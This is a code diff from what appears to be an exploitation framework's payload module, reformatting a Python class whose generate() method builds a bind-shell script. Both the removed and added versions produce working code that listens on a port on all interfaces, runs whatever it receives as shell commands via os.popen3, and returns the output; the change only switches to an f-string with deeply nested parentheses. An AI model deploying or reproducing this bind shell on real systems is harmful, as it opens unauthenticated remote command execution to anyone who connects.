@@ -21,15 +21,28 @@ class Payload(BindTCPPayloadMixin, GenericPayload):
 
     def generate(self):
         return (
-            "import socket,os\n" +
-            "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n" +
-            "so.bind(('0.0.0.0',{}))\n".format(self.rport) +
-            "so.listen(1)\n" +
-            "so,addr=so.accept()\n" +
-            "x=False\n" +
-            "while not x:\n" +
-            "\tdata=so.recv(1024)\n" +
-            "\tstdin,stdout,stderr,=os.popen3(data)\n" +
-            "\tstdout_value=stdout.read()+stderr.read()\n" +
-            "\tso.send(stdout_value)\n"
-        )
+            (
+                (
+                    (
+                        (
+                            (
+                                (
+                                    (
+                                        "import socket,os\n"
+                                        + "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
+                                        + f"so.bind(('0.0.0.0',{self.rport}))\n"
+                                    )
+                                    + "so.listen(1)\n"
+                                )
+                                + "so,addr=so.accept()\n"
+                            )
+                            + "x=False\n"
+                        )
+                        + "while not x:\n"
+                    )
+                    + "\tdata=so.recv(1024)\n"
+                )
+                + "\tstdin,stdout,stderr,=os.popen3(data)\n"
+            )
+            + "\tstdout_value=stdout.read()+stderr.read()\n"
+        ) + "\tso.send(stdout_value)\n"
